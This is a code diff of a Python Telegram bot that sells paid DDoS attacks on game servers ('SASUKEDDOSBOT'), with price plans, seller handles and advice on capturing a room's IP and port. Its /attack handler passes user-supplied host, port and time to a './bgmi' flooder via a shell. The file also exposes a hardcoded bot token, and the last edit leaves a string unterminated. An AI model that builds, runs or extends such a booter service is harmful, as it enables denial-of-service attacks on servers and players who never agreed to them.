@@ -6,10 +6,10 @@ import os
 import random
 
 # Put Your Telegram Bot Token Here
-bot = telebot.TeleBot('7360021855:AAHed9aMVMRD6YcGUQ4TqkhIgOI770XK05I)
+bot = telebot.TeleBot('7360021855:AAHed9aMVMRD6YcGUQ4TqkhIgOI770XK05I')
 
 # Admin User ID
-admin_id = ["6304585161"]
+admin_id = ["6304585161","7113416108","6478608805"]
 
 # File To Store Authorised User IDs
 USER_FILE = "users.txt"
@@ -49,7 +49,7 @@ allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
-    admin_id = ["6478608805","6304585161","7113416108"]
+    admin_id = ["6304585161","7113416108","6478608805"]
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
@@ -168,7 +168,7 @@ def get_user_info(message):
     user_last = user_info.last_name
     user_role = "𝐀𝐝𝐦𝐢𝐧" if user_id in admin_id else "𝐔𝐬𝐞𝐫"
     remaining_time = get_remaining_approval_time(user_id)
-    response = f"ℹ️ 𝐘𝐨𝐮𝐫 𝐈𝐧𝐟𝐨 :\n\n🆔 𝐔𝐬𝐞𝐫 𝐈𝐝: <code>{user_id}</code>\n💳 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{user_name}\n👤 𝐅𝐢𝐫𝐬𝐭 𝐍𝐚𝐦𝐞 :- {user_first}\n👤 𝐋𝐚𝐬𝐭 𝐍𝐚𝐦𝐞 :- {user_last}\n\nℹ️ 𝐘𝐨𝐮𝐫 𝐈𝐧𝐟𝐨 𝐎𝐧 SASUKEDDOSBOT :\n\n🏷️ 𝐑𝐨𝐥𝐞: {user_role}\n📆 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞: {user_approval_expiry.get(user_id, '𝐍𝐨𝐭 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝')}\n⏳ 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐓𝐢𝐦𝐞: {remaining_time}"
+    response = f"ℹ️ 𝐘𝐨𝐮𝐫 𝐈𝐧𝐟𝐨 :\n\n🆔 𝐔𝐬𝐞𝐫 𝐈𝐝: <code>{user_id}</code>\n💳 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{user_name}\n👤 𝐅𝐢𝐫𝐬𝐭 𝐍𝐚𝐦𝐞 :- {user_first}\n👤 𝐋𝐚𝐬𝐭 𝐍𝐚𝐦𝐞 :- {user_last}\n\nℹ️ 𝐘𝐨𝐮𝐫 𝐈𝐧𝐟𝐨 𝐎𝐧 𝐃𝐃𝐨𝐒 :\n\n🏷️ 𝐑𝐨𝐥𝐞: {user_role}\n📆 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞: {user_approval_expiry.get(user_id, '𝐍𝐨𝐭 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝')}\n⏳ 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐀𝐩𝐩𝐫𝐨𝐯𝐚𝐥 𝐓𝐢𝐦𝐞: {remaining_time}"
     bot.reply_to(message, response, parse_mode="HTML")
 
 @bot.message_handler(commands=['id'])
@@ -345,7 +345,7 @@ def handle_bgmi(message):
                 else:
                     full_command = f"./bgmi {target} {port} {time} 150"
                     subprocess.run(full_command, shell=True)
-                response = f"💎 𝐃𝐄𝐀𝐑 𝐕𝐈𝐏 𝐔𝐒𝐄𝐑 {user_name} 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : SASUKE\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧 𝐂𝐡𝐚𝐭 𝐆𝐫𝐨𝐮𝐩"
+                response = f"💎 𝐃𝐄𝐀𝐑 𝐕𝐈𝐏 𝐔𝐒𝐄𝐑 {user_name} 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n🎯 𝐇𝐨𝐬𝐭: {target}\n🔗 𝐏𝐨𝐫𝐭: {port}\n⏳ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : 𝐃𝐃𝐨𝐒\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧 𝐂𝐡𝐚𝐭 𝐆𝐫𝐨𝐮𝐩"
         else:
             response = "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐨𝐫𝐦𝐚𝐭 ⚠️\n\n✅ 𝐔𝐬𝐚𝐠𝐞 :- /attack <𝐡𝐨𝐬𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>\n\n✅ 𝐅𝐨𝐫 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 :- /attack 127.0.0.0 8700 300"  # Updated command syntax
     else:
@@ -389,8 +389,8 @@ def show_help(message):
 𝐓𝐨 𝐒𝐞𝐞 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:
 💎 /admin : 𝐒𝐡𝐨𝐰𝐬 𝐀𝐥𝐥 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬.
 
-🛒 𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 :-\n𝟏.@SASUKEPIRO\n𝟐.@veinxd\n𝟑.@HitlerxPapaa\n
-🏫𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :- @SASUKEPIRO1
+🛒 𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 :-\n𝟏.@SASUKEPIRO\n𝟐.@HitlerxPapaa\n𝟑.@veinxd\n
+🏫𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :- http://t.me/SASUKEPIRO1
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -405,8 +405,8 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''💐𝐖𝐞𝐥𝐜𝐨𝐦𝐞 {𝐮𝐬𝐞𝐫_𝐧𝐚𝐦𝐞} 𝐓𝐨 𝐎𝐮𝐫 𝐁𝐨𝐭 :-\n🤖 SASUKEPIRO 🤖\n𝐅𝐞𝐞𝐥 𝐅𝐫𝐞𝐞 𝐓𝐨 𝐄𝐱𝐩𝐥𝐨𝐫𝐞\n𝐅𝐨𝐫 𝐌𝐨𝐫𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐓𝐫𝐲 𝐓𝐨 𝐑𝐮𝐧 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : /help\n
-🛒 𝐁𝐮𝐲 𝐀𝐜𝐜𝐞𝐬𝐬 𝐅𝐫𝐨𝐦 :-\n𝟏.@SASIKEPIRO\n𝟐.@HitlerxPapaa\n𝟑.@veinxd'''
+    response = f'''💐𝐖𝐞𝐥𝐜𝐨𝐦𝐞 {𝐮𝐬𝐞𝐫_𝐧𝐚𝐦𝐞} 𝐓𝐨 𝐎𝐮𝐫 𝐁𝐨𝐭 :-\n🤖 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 🤖\n𝐅𝐞𝐞𝐥 𝐅𝐫𝐞𝐞 𝐓𝐨 𝐄𝐱𝐩𝐥𝐨𝐫𝐞\n𝐅𝐨𝐫 𝐌𝐨𝐫𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐓𝐫𝐲 𝐓𝐨 𝐑𝐮𝐧 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : /help\n
+🛒 𝐁𝐮𝐲 𝐀𝐜𝐜𝐞𝐬𝐬 𝐅𝐫𝐨𝐦 :-\n𝟏.@sasukepiro\n𝟐.@HitlerxPapaa\n𝟑.@veinxd'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -415,14 +415,14 @@ def welcome_rules(message):
     response = f'''{user_name} 𝐏𝐥𝐞𝐚𝐬𝐞 𝐅𝐨𝐥𝐥𝐨𝐰 𝐓𝐡𝐞𝐬𝐞 𝐑𝐮𝐥𝐞𝐬 🚦:
 𝟏. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝐓𝐨𝐨 𝐌𝐚𝐧𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 !! 𝐂𝐚𝐮𝐬𝐞 𝐀 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭
 𝟐. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝟐 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐀𝐭 𝐒𝐚𝐦𝐞 𝐓𝐢𝐦𝐞 𝐁𝐞𝐜𝐳 𝐈𝐟 𝐔 𝐓𝐡𝐞𝐧 𝐔 𝐆𝐨𝐭 𝐁𝐚𝐧𝐧𝐞𝐝 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭.
-𝟑. 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝 @SASUKEPIRO 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐖𝐨𝐫𝐤.
+𝟑. 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝 @SASUKEPIRO1 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐖𝐨𝐫𝐤.
 𝟒. 𝐖𝐞 𝐃𝐚𝐢𝐥𝐲 𝐂𝐡𝐞𝐜𝐤𝐬 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐨 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐁𝐚𝐧!!!'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, 𝐖𝐞 𝐇𝐚𝐯𝐞 𝐎𝐧𝐥𝐲 𝟏 𝐏𝐥𝐚𝐧 𝐀𝐧𝐝 𝐓𝐡𝐚𝐭 𝐈𝐬 𝐏𝐨𝐰𝐞𝐫𝐟𝐮𝐥𝐥 𝐓𝐡𝐞𝐧 𝐀𝐧𝐲 𝐎𝐭𝐡𝐞𝐫 𝐃𝐃𝐨𝐒 𝐓𝐡𝐚𝐭 𝐈𝐬 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 !!!:
+    response = f'''{user_name}, 𝐖𝐞 𝐇𝐚𝐯𝐞 𝐎𝐧𝐥𝐲 𝟏 𝐏𝐥𝐚𝐧 𝐀𝐧𝐝 𝐓𝐡𝐚𝐭 𝐈𝐬 𝐏𝐨𝐰𝐞𝐫𝐟𝐮𝐥𝐥 𝐓𝐡𝐞𝐧 𝐀𝐧𝐲 𝐎𝐭𝐡𝐞𝐫 𝐃𝐃𝐨𝐒 𝐓𝐡𝐚𝐭 𝐈𝐬 SASUKE !!!:
 
 💎 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 :
 -> 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞 : 𝟏𝟎𝟎𝟎 (𝐒)
@@ -431,12 +431,12 @@ def welcome_plan(message):
 
 💸 𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭 :
 𝐇𝐨𝐮𝐫-->𝟏𝟎 𝐑𝐬
-𝐃𝐚𝐲-->𝟓𝟎 𝐑𝐬
-𝐖𝐞𝐞𝐤-->𝟏𝟎𝟎 𝐑𝐬
-𝐌𝐨𝐧𝐭𝐡-->𝟐𝟎𝟎 𝐑𝐬
-𝐒𝐞𝐚𝐬𝐨𝐧-->𝟑𝟎𝟎 𝐑𝐬
+𝐃𝐚𝐲-->12𝟎 𝐑𝐬
+𝐖𝐞𝐞𝐤-->4𝟎𝟎 𝐑𝐬
+𝐌𝐨𝐧𝐭𝐡-->6𝟎𝟎 𝐑𝐬
+𝐒𝐞𝐚𝐬𝐨𝐧-->12𝟎𝟎 𝐑𝐬
 
-🛒 𝐈𝐟 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐮𝐲 𝐓𝐡𝐢𝐬 𝐏𝐥𝐚𝐧 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐀𝐝𝐦𝐢𝐧𝐬 :-\n𝟏.@SASUKEPIRO\n𝟐.@HitlerxPapaa\n𝟑.@veinxd
+🛒 𝐈𝐟 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐮𝐲 𝐓𝐡𝐢𝐬 𝐏𝐥𝐚𝐧 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐀𝐝𝐦𝐢𝐧𝐬 :-\n𝟏.@SASIKEPIRO\n𝟐.@HitlerxPapaa\n𝟑.@veinxd
 '''
     bot.reply_to(message, response)
 
@@ -481,7 +481,7 @@ def welcome_tutorial(message):
     user_name = message.from_user.first_name
     response = f'''{user_name} 𝐇𝐨𝐰 𝐓𝐨 𝐔𝐬𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 :
 
-📽️ /video : 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 SASUKEBOT.
+📽️ /video : 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 SASUKE DDOS.
 💻 /httpcanary : 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐨 𝐂𝐚𝐭𝐜𝐡 𝐑𝐨𝐨𝐦 𝐈𝐩 𝐀𝐧𝐝 𝐏𝐨𝐫𝐭.
 '''
 
@@ -490,14 +490,14 @@ def welcome_tutorial(message):
 @bot.message_handler(commands=['httpcanary'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name} 𝐇𝐞𝐫𝐞 𝐈𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐀𝐧 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐨 𝐂𝐚𝐭𝐜𝐡 𝐑𝐨𝐨𝐦 𝐈𝐩 𝐀𝐧𝐝 𝐏𝐨𝐫𝐭 :\n@SASUKEPIRO1'''
+    response = f'''{user_name} 𝐇𝐞𝐫𝐞 𝐈𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐀𝐧 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐨 𝐂𝐚𝐭𝐜𝐡 𝐑𝐨𝐨𝐦 𝐈𝐩 𝐀𝐧𝐝 𝐏𝐨𝐫𝐭 :\nhttps://t.me/SASUKEPIRO'''
     
     bot.reply_to(message, response)
     
 @bot.message_handler(commands=['video'])
 def welcome_rules(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name} 𝐇𝐞𝐫𝐞'𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 𝐃𝐃𝐨𝐒𝐒𝐞𝐑 :\n@SASUKEPIRO1'''
+    response = f'''{user_name} 𝐇𝐞𝐫𝐞'𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 SASUKEDDOS :\nhttps://t.me/SASUKEPIRO1
     
     bot.reply_to(message, response)
 
